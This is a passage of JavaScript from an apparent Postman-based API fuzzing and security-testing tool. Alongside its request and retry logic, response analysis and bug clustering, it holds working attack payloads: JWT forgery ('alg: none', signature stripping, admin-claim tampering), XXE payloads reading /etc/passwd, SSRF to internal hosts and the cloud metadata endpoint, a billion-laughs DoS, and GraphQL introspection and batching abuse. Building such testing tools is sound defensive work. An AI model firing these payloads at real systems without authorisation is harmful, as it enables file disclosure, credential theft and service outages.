        const errorMsg = String(error.message || error);
        return CONFIG.networkRetry.retryErrors.some(err => errorMsg.includes(err));
    };
    
    return {
        send: async function(method, url, bodyData, label, bodyFormat, rateLimiter) {
            await rateLimiter.wait();
            
            if (typeof pm === 'undefined') {
                throw new Error('PM object not available');
            }
            
            let lastError = null;
            let attempt = 0;
            const maxAttempts = CONFIG.networkRetry.enabled ? CONFIG.networkRetry.maxRetries + 1 : 1;
            
            while (attempt < maxAttempts) {
                try {
                    const requestConfig = {
                        method: method.toUpperCase(),
                        url: url,
                        header: pm.request.headers.toObject()
                    };
                    
                    if (bodyData) {
                        switch (bodyFormat) {
                            case 'json':
                                requestConfig.body = {
                                    mode: 'raw',
                                    raw: JSON.stringify(bodyData),
                                    options: { raw: { language: 'json' } }
                                };
                                break;
                            
                            case 'formdata':
                                requestConfig.body = {
                                    mode: 'formdata',
                                    formdata: bodyData
                                };
                                break;
                            
                            case 'urlencoded':
                                requestConfig.body = {
                                    mode: 'urlencoded',
                                    urlencoded: bodyData
                                };
                                break;
                            
                            case 'graphql':
                                requestConfig.body = {
                                    mode: 'raw',
                                    raw: JSON.stringify({
                                        query: bodyData.query,
                                        variables: bodyData.variables,
                                        operationName: bodyData.operationName
                                    }),
                                    options: { raw: { language: 'json' } }
                                };
                                break;
                            
                            case 'xml':
                            case 'text':
                                requestConfig.body = {
                                    mode: 'raw',
                                    raw: bodyData
                                };
                                break;
                        }
                    }
                    
                    const startTime = Date.now();
                    
                    return await new Promise((resolve, reject) => {
                        const timeoutId = setTimeout(() => {
                            reject(new Error('Timeout'));
                        }, CONFIG.requestTimeoutMs);
                        
                        pm.sendRequest(requestConfig, (err, res) => {
                            clearTimeout(timeoutId);
                            
                            if (err) {
                                reject(err);
                                return;
                            }
                            
                            const code = res?.code || 0;
                            let responseBody = null;
                            
                            try {
                                responseBody = res ? res.json() : null;
                            } catch (e) {
                                responseBody = res ? res.text() : null;
                            }
                            
                            resolve({
                                label,
                                code,
                                response: res,
                                responseBody,
                                responseTime: res?.responseTime || (Date.now() - startTime),
                                timestamp: Date.now()
                            });
                        });
                    });
                    
                } catch (e) {
                    lastError = e;
                    
                    const shouldRetryError = CONFIG.networkRetry.enabled &&
                                            attempt < maxAttempts - 1 &&
                                            isRetryableError(e);
                    
                    if (shouldRetryError) {
                        const delay = calculateRetryDelay(attempt);
                        console.log(`⚠️ Retry ${attempt + 1}/${maxAttempts - 1} (delay: ${delay}ms)`);
                        await new Promise(r => setTimeout(r, delay));
                        attempt++;
                    } else {
                        break;
                    }
                }
            }
            
            return {
                label,
                code: 0,
                responseTime: 0,
                responseBody: null,
                error: lastError ? lastError.message : 'Unknown error',
                timeout: true,
                timestamp: Date.now()
            };
        }
    };
};

// Postman Adapter
const PostmanAdapter = {
    extractMethodAndUrl: function() {
        if (typeof pm === 'undefined' || !pm.request) {
            throw new Error('pm.request not available');
        }
        
        return {
            method: pm.request.method,
            url: pm.request.url.toString()
        };
    },
    
    extractQueryParams: function() {
        if (typeof pm === 'undefined' || !pm.request || !pm.request.url) {
            return {};
        }
        
        const queryParams = {};
        const urlObj = pm.request.url;
        
        if (urlObj.query && Array.isArray(urlObj.query)) {
            for (const param of urlObj.query) {
                if (param.key && !param.disabled) {
                    queryParams[param.key] = param.value || '';
                }
            }
        }
        
        return queryParams;
    },
    
    buildUrlWithParams: function(baseUrl, queryParams) {
        if (!queryParams || Object.keys(queryParams).length === 0) {
            return baseUrl;
        }
        
        const urlWithoutQuery = baseUrl.split('?')[0];
        const queryString = Object.entries(queryParams)
            .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
            .join('&');
        
        return queryString ? `${urlWithoutQuery}?${queryString}` : urlWithoutQuery;
    },
    
    setTest: function(name, fn, CONFIG) {
        if (!CONFIG.features.postmanTest || typeof pm === 'undefined') return;
        
        try {
            pm.test(name, fn);
        } catch (err) {
            console.error(`Test error: ${err.message}`);
        }
    }
};

// Body Format Detection
const detectBodyFormat = function(Utils) {
    if (typeof pm === 'undefined' || !pm.request || !pm.request.body) {
        return { format: 'none', data: null };
    }
    
    const body = pm.request.body;
    
    if (body.mode === 'formdata' && body.formdata) {
        return { format: 'formdata', data: body.formdata };
    }
    
    if (body.mode === 'urlencoded' && body.urlencoded) {
        return { format: 'urlencoded', data: body.urlencoded };
    }
    
    if (body.mode === 'raw' && body.raw) {
        const rawContent = body.raw.trim();
        
        if (rawContent.startsWith('<?xml') || rawContent.startsWith('<')) {
            return { format: 'xml', data: rawContent };
        }
        
        try {
            const cleaned = Utils.removeComments(rawContent);
            const escaped = Utils.escapeUnquotedTemplates(cleaned);
            const parsed = JSON.parse(escaped);
            
            if (parsed.query || parsed.mutation) {
                return { format: 'graphql', data: parsed };
            }
            
            return { format: 'json', data: parsed };
        } catch (e) {
            console.error('⚠️ JSON parse error:', e.message);
            return { format: 'text', data: rawContent };
        }
    }
    
    return { format: 'none', data: null };
};

if (typeof module !== 'undefined' && module.exports) {
    module.exports = { 
        createRateLimiter, 
        createHttpClient, 
        PostmanAdapter, 
        detectBodyFormat 
    };
}

console.log('✅ HTTP Client v24.1.0 - Improved retry logic');

// ============================================================================
// ENGINE v24.1.0 - Module 05: Template & Response Analysis
// ============================================================================

const MARKER_UNQ = "__UNQ_TPL__";

// Template Processor
const TemplateProcessor = {
    processTemplates: function(obj, incCache) {
        incCache = incCache || {};
        
        const processValue = (value) => {
            if (typeof value === 'string') {
                let shouldCast = false;
                let v = value;
                
                if (v.startsWith(MARKER_UNQ)) {
                    v = v.replace(MARKER_UNQ, '');
                    shouldCast = true;
                }
                
                if (v.includes('{{')) {
                    v = v.replace(/\{\{([^}]+)\}\}/g, (match, varName) => {
                        const isDynamic = typeof DYNAMIC_VARIABLES !== 'undefined' && 
                                         DYNAMIC_VARIABLES.some(dv => varName.includes(dv));
                        
                        if (isDynamic) {
                            try {
                                return typeof pm !== 'undefined' && pm.variables 
                                    ? pm.variables.replaceIn(match)
                                    : match;
                            } catch {
                                return match;
                            }
                        } else {
                            if (!(match in incCache)) {
                                try {
                                    const resolved = typeof pm !== 'undefined' && pm.variables
                                        ? pm.variables.replaceIn(match)
                                        : match;
                                    
                                    if (resolved !== match && resolved !== '') {
                                        incCache[match] = resolved;
                                    } else {
                                        return resolved;
                                    }
                                } catch {
                                    return match;
                                }
                            }
                            return incCache.hasOwnProperty(match) 
                                ? incCache[match] 
                                : (typeof pm !== 'undefined' && pm.variables 
                                    ? pm.variables.replaceIn(match) 
                                    : match);
                        }
                    });
                }
                
                if (shouldCast) {
                    const trim = v.trim();
                    if (trim === "true") return true;
                    if (trim === "false") return false;
                    if (trim === "null") return null;
                    
                    if (/^-?\d+(\.\d+)?([eE][+-]?\d+)?$/.test(trim)) {
                        const n = Number(trim);
                        if (!isNaN(n) && isFinite(n)) return n;
                    }
                }
                
                return v;
            }
            
            if (Array.isArray(value)) {
                return value.map(item => processValue(item));
            }
            
            if (value !== null && typeof value === 'object') {
                const result = {};
                for (const key in value) {
                    if (value.hasOwnProperty(key)) {
                        result[key] = processValue(value[key]);
                    }
                }
                return result;
            }
            
            return value;
        };
        
        return processValue(obj);
    }
};

// Response Analyzer
const ResponseAnalyzer = {
    abortCounters: {
        sameError: 0,
        lastErrorKey: null,
        serverCrash: 0,
        totalConsecutive: 0
    },
    
    resetAbortCounters: function() {
        this.abortCounters = {
            sameError: 0,
            lastErrorKey: null,
            serverCrash: 0,
            totalConsecutive: 0
        };
    },
    
    classifyError: function(code, responseBody, response, CONFIG) {
        if (!responseBody || !CONFIG) return null;
        
        const errorText = JSON.stringify(responseBody).toLowerCase();
        
        for (const [className, patterns] of Object.entries(CONFIG.errorClassifiers)) {
            for (const pattern of patterns) {
                if (pattern.test ? pattern.test(errorText) : errorText.includes(pattern)) {
                    return className;
                }
            }
        }
        
        if (code >= 500) return 'serverCrash';
        if (code >= 400) return 'validation';
        
        return null;
    },
    
    createSignature: function(code, responseBody, response, Utils) {
        try {
            const bodyStr = typeof responseBody === 'string' 
                ? responseBody 
                : JSON.stringify(responseBody);
            
            const snippet = bodyStr.substring(0, 200);
            const errorClass = this.classifyError(code, responseBody, response, 
                typeof CONFIG !== 'undefined' ? CONFIG : {errorClassifiers: {}}) || 'NONE';
            
            return `${code}:${errorClass}:${Utils.hashDJB2(snippet)}`;
        } catch {
            return `${code}:ERROR:UNKNOWN`;
        }
    },
    
    checkAbort: function(result, CONFIG) {
        if (!CONFIG || !CONFIG.features.abortFast || !result) return false;
        
        const code = result.code;
        const errorClass = result.errorClass;
        
        if (code >= 200 && code < 400) {
            this.resetAbortCounters();
            return false;
        }
        
        this.abortCounters.totalConsecutive++;
        
        if (this.abortCounters.totalConsecutive >= CONFIG.abortFast.totalConsecutive) {
            if (typeof stats !== 'undefined') {
                stats.abortReasons = stats.abortReasons || [];
                stats.abortReasons.push(`Consecutive errors ×${this.abortCounters.totalConsecutive}`);
            }
            return true;
        }
        
        const errorKey = `${code}:${errorClass || 'NONE'}`;
        
        if (this.abortCounters.lastErrorKey === errorKey) {
            this.abortCounters.sameError++;
        } else {
            this.abortCounters.lastErrorKey = errorKey;
            this.abortCounters.sameError = 1;
        }
        
        if (this.abortCounters.sameError >= CONFIG.abortFast.sameError) {
            if (typeof stats !== 'undefined') {
                stats.abortReasons = stats.abortReasons || [];
                stats.abortReasons.push(`Same error ×${this.abortCounters.sameError} (${errorKey})`);
            }
            return true;
        }
        
        if (errorClass === 'serverCrash') {
            this.abortCounters.serverCrash++;
            
            if (this.abortCounters.serverCrash >= CONFIG.abortFast.serverCrash) {
                if (typeof stats !== 'undefined') {
                    stats.abortReasons = stats.abortReasons || [];
                    stats.abortReasons.push(`Server crashes ×${this.abortCounters.serverCrash}`);
                }
                return true;
            }
        }
        
        return false;
    },
    
    detectRequiredField: function(pathStr, code, responseBody, stats) {
        if (!stats || !stats.requiredFields) return;
        
        if (code === 400 || code === 422) {
            const bodyStr = JSON.stringify(responseBody).toLowerCase();
            const fieldName = pathStr.split('.').pop().toLowerCase();
            
            if (bodyStr.includes(fieldName) && 
                (bodyStr.includes('required') || 
                 bodyStr.includes('missing') || 
                 bodyStr.includes('mandatory'))) {
                stats.requiredFields.add(pathStr);
            }
        }
    }
};

// Bug Clustering
const BugClustering = {
    clusterBySignature: function(results) {
        const clusters = new Map();
        
        for (const result of results) {
            if (!result || result.code < 400) continue;
            
            const sig = result.signature;
            if (!sig) continue;
            
            if (!clusters.has(sig)) {
                clusters.set(sig, {
                    signature: sig,
                    count: 0,
                    code: result.code,
                    errorClass: result.errorClass,
                    representative: result,
                    occurrences: []
                });
            }
            
            const cluster = clusters.get(sig);
            cluster.count++;
            cluster.occurrences.push({
                label: result.label,
                code: result.code
            });
        }
        
        return clusters;
    },
    
    getSortedClusters: function(clusters) {
        return Array.from(clusters.values()).sort((a, b) => {
            if (a.code >= 500 && b.code < 500) return -1;
            if (a.code < 500 && b.code >= 500) return 1;
            return b.count - a.count;
        });
    }
};

// Stats Factory
const createFreshStats = function() {
    return {
        total: 0,
        skipped: 0,
        codes: {},
        responseTimes: [],
        startTime: Date.now(),
        abortReasons: [],
        
        stageResults: {
            baseline: [],
            fuzz: [],
            singleDelete: [],
            cumulativeDelete: []
        },
        
        baselineVerdict: null,
        baselineSignatures: [],
        baselineResponses: [],
        
        requiredFields: new Set(),
        
        failureSignatures: new Set(),
        signatureCache: new Map(),
        bugClusters: new Map(),
        
        bodyFormat: 'unknown',
        formatStats: {
            formDataFields: 0,
            formDataFiles: 0,
            urlencodedFields: 0,
            graphqlVariables: 0,
            xmlElements: 0
        },
        
        securityTests: {
            jwt: 0,
            pagination: 0,
            headerInjection: 0,
            graphqlIntrospection: 0,
            xxe: 0
        },
        
        bugs: 0,
        requests: 0,
        mutations: 0,
        warnings: []
    };
};

if (typeof module !== 'undefined' && module.exports) {
    module.exports = { 
        TemplateProcessor, 
        ResponseAnalyzer, 
        BugClustering, 
        createFreshStats,
        MARKER_UNQ
    };
}

console.log('✅ Template & Response Analysis v24.1.0 - Security stats tracking added');

// ============================================================================
// ENGINE v24.1.0 - Module 06: Security Tests
// ============================================================================

const SecurityTests = {
    
    // JWT/Token Security Testing
    testJWTSecurity: async function(method, url, templateOriginal, bodyFormat, CONFIG, Utils, TemplateProcessor, httpClient, rateLimiter, stats, ResponseAnalyzer, allStagesResults) {
        if (!CONFIG.jwtConfig.enabled) return;
        
        console.log('\n🔐 JWT/Token Security Tests\n');
        
        const headers = typeof pm !== 'undefined' && pm.request ? pm.request.headers.toObject() : {};
        const jwtTests = [];
        
        for (const [key, value] of Object.entries(headers)) {
            if (key.toLowerCase().includes('authorization') && 
                value.includes('Bearer ') &&
                value.split('.').length === 3) {
                
                const jwt = value.replace('Bearer ', '');
                const parts = jwt.split('.');
                
                if (parts.length !== 3) continue;
                
                const [headerPart, payloadPart, signaturePart] = parts;
                
                try {
                    const header = JSON.parse(atob(headerPart));
                    const payload = JSON.parse(atob(payloadPart));
                    
                    if (CONFIG.jwtConfig.testAlgorithmNone) {
                        const modifiedHeader = { ...header, alg: 'none' };
                        const newToken = `${btoa(JSON.stringify(modifiedHeader))}.${payloadPart}.`;
                        jwtTests.push({
                            key: key,
                            value: `Bearer ${newToken}`,
                            attack: 'algorithm_none'
                        });
                    }
                    
                    if (CONFIG.jwtConfig.testSignatureRemoval) {
                        jwtTests.push({
                            key: key,
                            value: `Bearer ${headerPart}.${payloadPart}.`,
                            attack: 'signature_removal'
                        });
                    }
                    
                    if (CONFIG.jwtConfig.testPayloadTampering) {
                        for (const claim of CONFIG.jwtConfig.claimsToTamper) {
                            if (payload[claim]) {
                                for (const adminVal of CONFIG.jwtConfig.adminValues) {
                                    const modifiedPayload = { ...payload };
                                    modifiedPayload[claim] = adminVal;
                                    const newPayload = btoa(JSON.stringify(modifiedPayload));
                                    jwtTests.push({
                                        key: key,
                                        value: `Bearer ${headerPart}.${newPayload}.${signaturePart}`,
                                        attack: `tamper_${claim}_to_${adminVal}`
                                    });
                                }
                            }
                        }
                    }
                    
                    if (CONFIG.jwtConfig.testExpiredToken && payload.exp) {
                        const expiredPayload = { ...payload, exp: Math.floor(Date.now() / 1000) - 3600 };
                        const newPayload = btoa(JSON.stringify(expiredPayload));
                        jwtTests.push({
                            key: key,
                            value: `Bearer ${headerPart}.${newPayload}.${signaturePart}`,
                            attack: 'expired_token'
                        });
                    }
                    
                } catch (e) {
                    console.warn(`⚠️ Failed to decode JWT: ${e.message}`);
                }
            }
        }
        
        console.log(`Testing ${jwtTests.length} JWT mutations\n`);
        
        for (const test of jwtTests) {
            if (checkGlobalTimeout(stats, CONFIG) || checkCircuitBreaker(stats, CONFIG)) {
                console.log('🛑 JWT tests aborted');
                return;
            }
            
            if (typeof pm !== 'undefined') {
                pm.request.headers.upsert({key: test.key, value: test.value});
            }
            
            let bodyData = Utils.deepCopy(templateOriginal);
            if (bodyFormat === 'json' || bodyFormat === 'graphql') {
                bodyData = TemplateProcessor.processTemplates(bodyData, {});
            }
            
            const result = await httpClient.send(
                method, url, bodyData,
                `JWT:${test.attack}`,
                bodyFormat, rateLimiter
            );
            
            if (typeof pm !== 'undefined') {
                pm.request.headers.upsert({key: test.key, value: headers[test.key]});
            }
            
            if (result) {
                this.updateStatsFromResult(result, stats, ResponseAnalyzer, CONFIG, Utils);
                allStagesResults.push(result);
                stats.stageResults.fuzz.push(result);
                stats.securityTests.jwt++;
            }
            
            if (result?.aborted || ResponseAnalyzer.checkAbort(result, CONFIG)) {
                console.log('🛑 JWT tests aborted');
                return;
            }
            
            await Utils.delay(CONFIG.delayMs);
        }
        
        console.log('✅ JWT tests complete\n');
    },
    
    // Pagination Abuse Testing
    testPaginationAbuse: async function(method, url, templateOriginal, allNodes, bodyFormat, provider, CONFIG, Utils, TemplateProcessor, httpClient, rateLimiter, stats, ResponseAnalyzer, allStagesResults, PostmanAdapter) {
        if (!CONFIG.paginationConfig.enabled) return;
        
        console.log('\n📄 Pagination Abuse Tests\n');
        
        const paginationTests = [];
        
        const queryParams = PostmanAdapter.extractQueryParams();
        for (const [key, value] of Object.entries(queryParams)) {
            if (CONFIG.paginationConfig.keywords.some(kw => key.toLowerCase().includes(kw))) {
                for (const testVal of CONFIG.paginationConfig.testValues) {
                    paginationTests.push({
                        type: 'query',
                        key: key,
                        value: testVal,
                        originalParams: queryParams
                    });
                }
            }
        }
        
        const paginationNodes = allNodes.filter(n => 
            n.valueType === 'primitive' && 
            CONFIG.paginationConfig.keywords.some(kw => 
                n.pathStr.toLowerCase().includes(kw)
            )
        );
        
        for (const node of paginationNodes) {
            for (const testVal of CONFIG.paginationConfig.testValues) {
                paginationTests.push({
                    type: 'body',
                    node: node,
                    value: testVal
                });
            }
        }
        
        console.log(`Testing ${paginationTests.length} pagination mutations\n`);
        
        for (const test of paginationTests) {
            if (checkGlobalTimeout(stats, CONFIG) || checkCircuitBreaker(stats, CONFIG)) {
                console.log('🛑 Pagination tests aborted');
                return;
            }
            
            let testUrl = url;
            let bodyData = Utils.deepCopy(templateOriginal);
            
            if (test.type === 'query') {
                const modifiedParams = { ...test.originalParams };
                modifiedParams[test.key] = test.value;
                testUrl = PostmanAdapter.buildUrlWithParams(url, modifiedParams);
            } else {
                provider.setByPath(bodyData, test.node.path, test.value);
            }
            
            if (bodyFormat === 'json' || bodyFormat === 'graphql') {
                bodyData = TemplateProcessor.processTemplates(bodyData, {});
            }
            
            const label = test.type === 'query' 
                ? `PAGINATION:query.${test.key}=${Utils.safeStringify(test.value).substring(0, 20)}`
                : `PAGINATION:${test.node.pathStr}=${Utils.safeStringify(test.value).substring(0, 20)}`;
            
            const result = await httpClient.send(
                method, testUrl, bodyData, label, bodyFormat, rateLimiter
            );
            
            if (result) {
                this.updateStatsFromResult(result, stats, ResponseAnalyzer, CONFIG, Utils);
                allStagesResults.push(result);
                stats.stageResults.fuzz.push(result);
                stats.securityTests.pagination++;
            }
            
            if (result?.aborted || ResponseAnalyzer.checkAbort(result, CONFIG)) {
                console.log('🛑 Pagination tests aborted');
                return;
            }
            
            await Utils.delay(CONFIG.delayMs);
        }
        
        console.log('✅ Pagination tests complete\n');
    },
    
    // Header Injection Testing
    testHeaderInjection: async function(method, url, templateOriginal, bodyFormat, CONFIG, Utils, TemplateProcessor, httpClient, rateLimiter, stats, ResponseAnalyzer, allStagesResults) {
        if (!CONFIG.headerInjectionConfig.enabled) return;
        
        console.log('\n📨 Header Injection Tests\n');
        
        const originalHeaders = typeof pm !== 'undefined' && pm.request ? pm.request.headers.toObject() : {};
        
        console.log(`Testing ${CONFIG.headerInjectionConfig.injections.length} header injections\n`);
        
        for (const injectedHeader of CONFIG.headerInjectionConfig.injections) {
            if (checkGlobalTimeout(stats, CONFIG) || checkCircuitBreaker(stats, CONFIG)) {
                console.log('🛑 Header injection tests aborted');
                return;
            }
            
            const [headerName, headerValue] = Object.entries(injectedHeader)[0];
            
            if (typeof pm !== 'undefined') {
                pm.request.headers.upsert({key: headerName, value: headerValue});
            }
            
            let bodyData = Utils.deepCopy(templateOriginal);
            if (bodyFormat === 'json' || bodyFormat === 'graphql') {
                bodyData = TemplateProcessor.processTemplates(bodyData, {});
            }
            
            const result = await httpClient.send(
                method, url, bodyData,
                `HEADER:${headerName}=${headerValue}`,
                bodyFormat, rateLimiter
            );
            
            if (typeof pm !== 'undefined') {
                if (originalHeaders[headerName]) {
                    pm.request.headers.upsert({key: headerName, value: originalHeaders[headerName]});
                } else {
                    pm.request.headers.remove(headerName);
                }
            }
            
            if (result) {
                this.updateStatsFromResult(result, stats, ResponseAnalyzer, CONFIG, Utils);
                allStagesResults.push(result);
                stats.stageResults.fuzz.push(result);
                stats.securityTests.headerInjection++;
            }
            
            if (result?.aborted || ResponseAnalyzer.checkAbort(result, CONFIG)) {
                console.log('🛑 Header injection tests aborted');
                return;
            }
            
            await Utils.delay(CONFIG.delayMs);
        }
        
        console.log('✅ Header injection tests complete\n');
    },
    
    // GraphQL Introspection Testing
    testGraphQLIntrospection: async function(method, url, templateOriginal, bodyFormat, CONFIG, Utils, httpClient, rateLimiter, stats, ResponseAnalyzer, allStagesResults) {
        if (!CONFIG.graphqlConfig.enabled || bodyFormat !== 'graphql') return;
        
        console.log('\n🔎 GraphQL Introspection Tests\n');
        
        const tests = [];
        
        if (CONFIG.graphqlConfig.introspectionEnabled) {
            tests.push({
                query: `{
                    __schema {
                        types {
                            name
                            fields {
                                name
                                type { name }
                            }
                        }
                    }
                }`,
                variables: {},
                attack: 'introspection'
            });
        }
        
        if (CONFIG.graphqlConfig.testDeepNesting && templateOriginal.query) {
            let deepQuery = templateOriginal.query;
            for (let i = 0; i < CONFIG.graphqlConfig.maxQueryDepth + 5; i++) {
                deepQuery = deepQuery.replace('{', '{ nested {') + '}';
            }
            tests.push({
                query: deepQuery,
                variables: templateOriginal.variables || {},
                attack: 'deep_nesting'
            });
        }
        
        if (CONFIG.graphqlConfig.testBatching && templateOriginal.query) {
            const batchQueries = [];
            for (let i = 0; i < CONFIG.graphqlConfig.maxBatchSize; i++) {
                batchQueries.push(`query${i}: ${templateOriginal.query}`);
            }
            tests.push({
                query: `{ ${batchQueries.join(' ')} }`,
                variables: {},
                attack: 'batch_abuse'
            });
        }
        
        console.log(`Testing ${tests.length} GraphQL attacks\n`);
        
        for (const test of tests) {
            if (checkGlobalTimeout(stats, CONFIG) || checkCircuitBreaker(stats, CONFIG)) {
                console.log('🛑 GraphQL tests aborted');
                return;
            }
            
            const bodyData = {
                query: test.query,
                variables: test.variables,
                operationName: templateOriginal.operationName
            };
            
            const result = await httpClient.send(
                method, url, bodyData,
                `GRAPHQL:${test.attack}`,
                bodyFormat, rateLimiter
            );
            
            if (result) {
                this.updateStatsFromResult(result, stats, ResponseAnalyzer, CONFIG, Utils);
                allStagesResults.push(result);
                stats.stageResults.fuzz.push(result);
                stats.securityTests.graphqlIntrospection++;
            }
            
            if (result?.aborted || ResponseAnalyzer.checkAbort(result, CONFIG)) {
                console.log('🛑 GraphQL tests aborted');
                return;
            }
            
            await Utils.delay(CONFIG.delayMs);
        }
        
        console.log('✅ GraphQL tests complete\n');
    },
    
    // XML XXE Testing
    testXMLXXE: async function(method, url, templateOriginal, bodyFormat, CONFIG, Utils, httpClient, rateLimiter, stats, ResponseAnalyzer, allStagesResults) {
        if (!CONFIG.xmlConfig.enabled || bodyFormat !== 'xml') return;
        
        console.log('\n💥 XML XXE Tests\n');
        
        const xxePayloads = [];
        
        if (CONFIG.xmlConfig.testFileRead) {
            xxePayloads.push({
                xml: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>`,
                attack: 'file_read_etc_passwd'
            });
            
            xxePayloads.push({
                xml: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<root>&xxe;</root>`,
                attack: 'file_read_etc_hosts'
            });
        }
        
        if (CONFIG.xmlConfig.testSSRF) {
            xxePayloads.push({
                xml: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server:8080/admin">]>
<root>&xxe;</root>`,
                attack: 'ssrf_internal'
            });
            
            xxePayloads.push({
                xml: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>`,
                attack: 'ssrf_metadata'
            });
        }
        
        if (CONFIG.xmlConfig.testDoS) {
            xxePayloads.push({
                xml: `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>`,
                attack: 'billion_laughs_dos'
            });
        }
        
        console.log(`Testing ${xxePayloads.length} XXE payloads\n`);
        
        for (const payload of xxePayloads) {
            if (checkGlobalTimeout(stats, CONFIG) || checkCircuitBreaker(stats, CONFIG)) {
                console.log('🛑 XXE tests aborted');
                return;
            }
            
            const result = await httpClient.send(
                method, url, payload.xml,
                `XXE:${payload.attack}`,
                bodyFormat, rateLimiter
            );
            
            if (result) {
                this.updateStatsFromResult(result, stats, ResponseAnalyzer, CONFIG, Utils);
                allStagesResults.push(result);
                stats.stageResults.fuzz.push(result);
                stats.securityTests.xxe++;
            }
            
            if (result?.aborted || ResponseAnalyzer.checkAbort(result, CONFIG)) {
                console.log('🛑 XXE tests aborted');
                return;
            }
            
            await Utils.delay(CONFIG.delayMs);
        }
        
        console.log('✅ XXE tests complete\n');
    },
    
    // Helper
    updateStatsFromResult: function(result, stats, ResponseAnalyzer, CONFIG, Utils) {
        stats.total++;
        stats.codes[result.code] = (stats.codes[result.code] || 0) + 1;
        if (result.responseTime) stats.responseTimes.push(result.responseTime);
        
        const errorType = ResponseAnalyzer.classifyError(result.code, result.responseBody, result.response, CONFIG);
        const signature = ResponseAnalyzer.createSignature(result.code, result.responseBody, result.response, Utils);
        
        result.errorClass = errorType;
        result.signature = signature;
        
        if (CONFIG.logShowResponse) {
            const icon = result.code >= 500 ? '💥' : result.code >= 400 ? '⚠️' : '✅';
            console.log(`${icon} [${result.code}] ${result.label} (${result.responseTime || 0}ms)`);
        }
    }
};

if (typeof module !== 'undefined' && module.exports) {
    module.exports = { SecurityTests };
}

console.log('✅ Security Tests v24.1.0 - FULLY RESTORED (JWT, Pagination, Headers, GraphQL, XXE)');

// ============================================================================
// ENGINE v24.1.0 - Module 07: Mutation Stages
// ============================================================================

const MutationStages = {
    
    // STAGE 0: Baseline
    async executeBaseline(method, url, templateOriginal, bodyFormat, CONFIG, Utils, TemplateProcessor, httpClient, rateLimiter, stats, ResponseAnalyzer) {
        if (!CONFIG.stages.baseline) return true;
        
        console.log('\n🎯 STAGE 0: BASELINE\n');
        ResponseAnalyzer.resetAbortCounters();
        
        const responses = [];
        
        for (let i = 0; i < 3; i++) {
            if (checkGlobalTimeout(stats, CONFIG) || checkCircuitBreaker(stats, CONFIG)) {
                return false;
            }
            
            const payload = Utils.deepCopy(templateOriginal);
            let processed = (bodyFormat === 'json' || bodyFormat === 'graphql') 
                ? TemplateProcessor.processTemplates(payload, {}) 
                : payload;
            
            const result = await httpClient.send(
                method, url, processed, `BASELINE ${i + 1}/3`, bodyFormat, rateLimiter
            );
            
            if (result) {
                responses.push(result);
                stats.stageResults.baseline.push(result);
                stats.total++;
                stats.codes[result.code] = (stats.codes[result.code] || 0) + 1;
                if (result.responseTime) stats.responseTimes.push(result.responseTime);
                console.log(`  ${i + 1}/3: [${result.code}] ${result.responseTime || 0}ms`);
            }
            
            if (i < 2) await Utils.delay(CONFIG.delayMs);
        }
        
        const codes = responses.map(r => r.code);
        const allSame = codes.every(c => c === codes[0]);
        
        if (allSame && codes[0] >= 200 && codes[0] < 400) {
            stats.baselineVerdict = 'STABLE';
            console.log('\nVerdict: ✅ STABLE\n');
            return true;
        } else if (codes.some(c => c >= 500)) {
            stats.baselineVerdict = 'FAILING';
            console.log('\nVerdict: 💥 FAILING\n');
            stats.abortReasons.push('Baseline failing');
            return false;
        } else {
            stats.baselineVerdict = 'UNSTABLE';
            console.log('\nVerdict: ⚠️ UNSTABLE\n');
            return true;
        }
    },
    
    // STAGE 1: Fuzzing with Security Tests
    async executeFuzzing(method, url, templateOriginal, allNodes, allStagesResults, bodyFormat, provider, CONFIG, Utils, TemplateProcessor, httpClient, rateLimiter, stats, ResponseAnalyzer, PostmanAdapter, SecurityTests) {
        if (!CONFIG.stages.fuzz) return;
        
        console.log('\n🧪 STAGE 1: ENHANCED FUZZING\n');
        ResponseAnalyzer.resetAbortCounters();
        
        const mutations = [];
        for (const policy of CONFIG.fuzzing.usePolicies) {
            if (CONFIG.mutationPolicies[policy]) {
                mutations.push(...CONFIG.mutationPolicies[policy]);
            }
        }
        const uniqueMutations = [...new Set(mutations)];
        
        let primitiveNodes = this.getFuzzableNodes(allNodes, bodyFormat, 'primitive', CONFIG, Utils);
        let objectNodes = this.getFuzzableNodes(allNodes, bodyFormat, 'object', CONFIG, Utils);
        let arrayNodes = this.getFuzzableNodes(allNodes, bodyFormat, 'array', CONFIG, Utils);
        
        console.log(`Primitives: ${primitiveNodes.length} | Objects: ${objectNodes.length} | Arrays: ${arrayNodes.length}\n`);
        
        // Fuzz primitives
        for (const node of primitiveNodes) {
            if (checkGlobalTimeout(stats, CONFIG) || checkCircuitBreaker(stats, CONFIG)) {
                console.log('🛑 Primitive fuzzing aborted');
                return;
            }
            
            for (const mutValue of uniqueMutations) {
                const v = Utils.deepCopy(templateOriginal);
                
                if (provider && provider.setByPath(v, node.path, mutValue)) {
                    let processed = (bodyFormat === 'json' || bodyFormat === 'graphql') 
                        ? TemplateProcessor.processTemplates(v, {}) 
                        : v;
                    
                    const result = await httpClient.send(
                        method, url, processed,
                        `FUZZ:${node.pathStr}=${Utils.safeStringify(mutValue).substring(0, 20)}`,
                        bodyFormat, rateLimiter
                    );
                    
                    if (result) {
                        this.updateStatsFromResult(result, stats, ResponseAnalyzer, CONFIG, Utils);
                        allStagesResults.push(result);
                        stats.stageResults.fuzz.push(result);
                    }
                    
                    if (result?.aborted || ResponseAnalyzer.checkAbort(result, CONFIG)) {
                        console.log('🛑 Primitive fuzzing aborted');
                        return;
                    }
                    
                    await Utils.delay(CONFIG.delayMs);
                }
            }
        }
        
        // Fuzz objects
        if (CONFIG.fuzzing.fuzzObjects && objectNodes.length > 0) {
            console.log(`\n📦 Fuzzing ${objectNodes.length} objects\n`);
